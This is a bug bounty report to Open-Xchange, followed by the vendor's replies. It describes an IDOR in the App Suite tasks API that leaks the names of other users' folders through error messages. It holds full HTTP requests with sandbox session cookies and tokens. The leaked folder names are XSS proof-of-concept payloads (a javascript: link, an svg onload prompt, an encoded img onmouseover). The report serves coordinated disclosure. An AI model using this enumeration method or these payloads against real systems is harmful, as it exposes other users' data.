title: IDOR to view other user folder name

profile.name: Open-Xchange
profile.about: Messaging, collaboration and office productivity software for service providers

vulnerability_information:
TESTED ACCOUNT:
=================
user3@sandbox-3.open-xchange.com

STEP TO REPRODUCE
====================
there is IDOR in viewing other user folder name
```
GET /appsuite/api/tasks?action=all&folder=44&columns=1%2C20%2C200%2C203%2C221%2C300%2C309%2C317&sort=317&order=asc&timezone=UTC&session=aad781a52fd544d69eaa62dfd0d0ab11 HTTP/1.1
Host: sandbox.open-xchange.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Referer: https://sandbox.open-xchange.com/appsuite/
Cookie: url.key=1553277096500867155327709650086715532770965008671553277096500867; JSESSIONID=1899118156435087899.OX0; language=en_US; open-xchange-secret-MeWgK3mqQXRRr3JTujngKA=370a6891e78649f29785cb70f4ee6502; open-xchange-public-session-1LRY2stgQURXZtkS54RKdw=5a464d4fd92e430fae651da541c6d9a1; metrics-userhash-v2=270a27384b1305fd5e4bd5573c0b854d
Connection: close

```
here start enumerating folder id and you will get id 44,89,95 which will disclose folder name.
But this folder is not belongs to current user.
Now confirm does 44,89,95 belong to current user or not.
```
GET /appsuite/api/files?action=zipfolder&folder=89&recursive=true&session=aad781a52fd544d69eaa62dfd0d0ab11&callback=chut HTTP/1.1
Host: sandbox.open-xchange.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Referer: https://sandbox.open-xchange.com/appsuite/
Cookie: ..
Connection: close
```
send this request  by changing folder id to 44,89,95 and you will get bellow response
```
<!DOCTYPE html><html><head><META http-equiv="Content-Type" content="text/html; charset=UTF-8"><script type="text/javascript">(parent["callback_chut"] || window.opener && window.opener["callback_chut"])({"error":"You do not have appropriate permissions to view the folder.","error_params":["89","5","135"],"categories":"PERMISSION_DENIED","category":3,"code":"FLD-0003","error_id":"-957952377-18407","error_desc":"Folder \"89\" is not visible to user \"5\" in context \"135\""})</script></head></html>
```

Now in response see those folder is not bellong to current user

## Impact

user can enum othe user folder name

user3@sandbox-3.open-xchange.com

STEP TO REPRODUCE

there is IDOR in viewing other user folder name

GET /appsuite/api/tasks?action=all&folder=44&columns=1%2C20%2C200%2C203%2C221%2C300%2C309%2C317&sort=317&order=asc&timezone=UTC&session=aad781a52fd544d69eaa62dfd0d0ab11 HTTP/1.1

activities.message: Thanks for the report. Please describe at what point a foreign folder name is exposed. You're requesting folder ID 89 and get the info that folder 89 cannot be accessed. No new information (like the folder name) is provided by this response.
activities.markdown_message: Thanks for the report. Please describe at what point a foreign folder name is exposed. You're requesting folder ID 89 and get the info that folder 89 cannot be accessed. No new information (like the folder name) is provided by this response.

activities.message: First loggin with user3@sandbox-3.open-xchange.com now send bellow request ``` GET /appsuite/api/tasks?action=all&folder=95&columns=1%2C20%2C200%2C203%2C221%2C300%2C309%2C317&sort=317&order=asc&timezone=UTC&session=7f40ab51817b4623a755454ba3ae7ed6 HTTP/1.1 Host: sandbox.open-xchange.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: en-US,en;q=0.5 Content-Type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest Referer: https://sandbox.open-xchange.com/appsuite/ui Cookie: url.key=1553277096500867155327709650086715532770965008671553277096500867; JSESSIONID=6645996149243390095.OX0; open-xchange-secret-MeWgK3mqQXRRr3JTujngKA=023e58e5feca459abb67622499035890; open-xchange-public-session-1LRY2stgQURXZtkS54RKdw=d591e967683448879b94e270f99da39d; open-xchange-session-MeWgK3mqQXRRr3JTujngKA=7f40ab51817b4623a755454ba3ae7ed6; language=en_US; metrics-userhash-v2=270a27384b1305fd5e4bd5573c0b854d; staySignedIn=true; open-xchange-secret-G21EbsLsmYUDl56cZ0JYg=8b38f5e4f62548fba701ae6f61a6e1f9; open-xchange-share-bc0aac3569031babbd73e069947a4b12=037b22300e18f65d37b22b8e18f6428ea219526f775518c0; open-xchange-public-session-JKHDj2lKufKtnb7ZZCJMhw=39526c128b804bae805be1940dc7f969; open-xchange-session-G21EbsLsmYUDl56cZ0JYg=7cec9297f39342a18b7182ce7a268e3d Connection: close ``` Here in get parameter folder id is 95 and response will be bellow ``` {"error":"This is not a task folder.","error_params":["Click Here",95],"categories":"PERMISSION_DENIED","category":3,"code":"TSK-0006","error_id":"-957952377-19447","error_desc":"Folder Click Here (95) is not a task folder."} ``` Now again change folder to 44 and response is...... ``` {"error":"This is not a task folder.","error_params":["\">
activities.markdown_message:
First loggin with user3@sandbox-3.open-xchange.com
now send bellow request

GET /appsuite/api/tasks?action=all&folder=95&columns=1%2C20%2C200%2C203%2C221%2C300%2C309%2C317&sort=317&order=asc&timezone=UTC&session=7f40ab51817b4623a755454ba3ae7ed6 HTTP/1.1
Host: sandbox.open-xchange.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Referer: https://sandbox.open-xchange.com/appsuite/ui
Cookie: url.key=1553277096500867155327709650086715532770965008671553277096500867; JSESSIONID=6645996149243390095.OX0; open-xchange-secret-MeWgK3mqQXRRr3JTujngKA=023e58e5feca459abb67622499035890; open-xchange-public-session-1LRY2stgQURXZtkS54RKdw=d591e967683448879b94e270f99da39d; open-xchange-session-MeWgK3mqQXRRr3JTujngKA=7f40ab51817b4623a755454ba3ae7ed6; language=en_US; metrics-userhash-v2=270a27384b1305fd5e4bd5573c0b854d; staySignedIn=true; open-xchange-secret-G21EbsLsmYUDl56cZ0JYg=8b38f5e4f62548fba701ae6f61a6e1f9; open-xchange-share-bc0aac3569031babbd73e069947a4b12=037b22300e18f65d37b22b8e18f6428ea219526f775518c0; open-xchange-public-session-JKHDj2lKufKtnb7ZZCJMhw=39526c128b804bae805be1940dc7f969; open-xchange-session-G21EbsLsmYUDl56cZ0JYg=7cec9297f39342a18b7182ce7a268e3d
Connection: close

Here in get parameter folder id is 95 and response will be bellow

{"error":"This is not a task folder.","error_params":["<a href=\"javascript:alert(document.domain)\">Click Here</a>",95],"categories":"PERMISSION_DENIED","category":3,"code":"TSK-0006","error_id":"-957952377-19447","error_desc":"Folder <a href=\"javascript:alert(document.domain)\">Click Here</a> (95) is not a task folder."}

Now again change folder to 44 and response is......

{"error":"This is not a task folder.","error_params":["\"></style></title></textarea></script><svg/onload=;prompt(/OPENBUGBOUNTY/);, \"></style></title></textarea></script><svg/onload=;prompt(/OPENBUGBOUNTY/);",44],"categories":"PERMISSION_DENIED","category":3,"code":"TSK-0006","error_id":"-957952377-19460","error_desc":"Folder \"></style></title></textarea></script><svg/onload=;prompt(/OPENBUGBOUNTY/);, \"></style></title></textarea></script><svg/onload=;prompt(/OPENBUGBOUNTY/); (44) is not a task folder."}

Now change folder to 89 and response is ....

{"error":"This is not a task folder.","error_params":["%3c%49%4d%47%20%53%52%43%3d%20%6f%6e%6d%6f%75%73%65%6f%76%65%72%3d%22%61%6c%65%72%74%28%27%78%78%73%27%29%22%3e%0a",89],"categories":"PERMISSION_DENIED","category":3,"code":"TSK-0006","error_id":"-957952377-19461","error_desc":"Folder %3c%49%4d%47%20%53%52%43%3d%20%6f%6e%6d%6f%75%73%65%6f%76%65%72%3d%22%61%6c%65%72%74%28%27%78%78%73%27%29%22%3e%0a (89) is not a task folder."}

and see all in folder id 44,89,95 folder name is disclose in response .but now verify that those folder not bellow to current user.

GET /appsuite/api/files?action=zipfolder&folder=95&recursive=true&session=7f40ab51817b4623a755454ba3ae7ed6 HTTP/1.1
Host: sandbox.open-xchange.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Referer: https://sandbox.open-xchange.com/appsuite/ui
Cookie: url.key=1553277096500867155327709650086715532770965008671553277096500867; JSESSIONID=6645996149243390095.OX0; open-xchange-secret-MeWgK3mqQXRRr3JTujngKA=023e58e5feca459abb67622499035890; open-xchange-public-session-1LRY2stgQURXZtkS54RKdw=d591e967683448879b94e270f99da39d; open-xchange-session-MeWgK3mqQXRRr3JTujngKA=7f40ab51817b4623a755454ba3ae7ed6; language=en_US; metrics-userhash-v2=270a27384b1305fd5e4bd5573c0b854d; staySignedIn=true; open-xchange-secret-G21EbsLsmYUDl56cZ0JYg=8b38f5e4f62548fba701ae6f61a6e1f9; open-xchange-share-bc0aac3569031babbd73e069947a4b12=037b22300e18f65d37b22b8e18f6428ea219526f775518c0; open-xchange-public-session-JKHDj2lKufKtnb7ZZCJMhw=39526c128b804bae805be1940dc7f969; open-xchange-session-G21EbsLsmYUDl56cZ0JYg=7cec9297f39342a18b7182ce7a268e3d
Connection: close

response will be 

{"error":"You do not have appropriate permissions to view the folder.","error_params":["95","5","135"],"categories":"PERMISSION_DENIED","category":3,"code":"FLD-0003","error_id":"-957952377-19458","error_desc":"Folder \"95\" is not visible to user \"5\" in context \"135\""}

do this same request for all id 44,89,95 and you get same error.

activities.message: Thanks for the detailed description, the problem is clear now.
activities.markdown_message: Thanks for the detailed description, the problem is clear now.

activities.message:
Thanks for reporting this vulnerability to us. We take your feedback very serious and started the process of resolving and delivering a solution to our users. Please note that we will take care about public disclosure of the vulnerability and give our users a chance to update to a fixed version before. Therefor, please handle this finding with discretion until we publicly disclosed it.

We'll discuss the matter of bounty for this finding soon and will update you shortly. Would you like to be included in our advisories "researcher credits"?
activities.markdown_message:
Thanks for reporting this vulnerability to us. We take your feedback very serious and started the process of resolving and delivering a solution to our users. Please note that we will take care about public disclosure of the vulnerability and give our users a chance to update to a fixed version before. Therefor, please handle this finding with discretion until we publicly disclosed it.

We'll discuss the matter of bounty for this finding soon and will update you shortly. Would you like to be included in our advisories "researcher credits"?

activities.message: We solved this vulnerability internally and will provide a backport to in-production releases during the next weeks.
activities.markdown_message: We solved this vulnerability internally and will provide a backport to in-production releases during the next weeks.
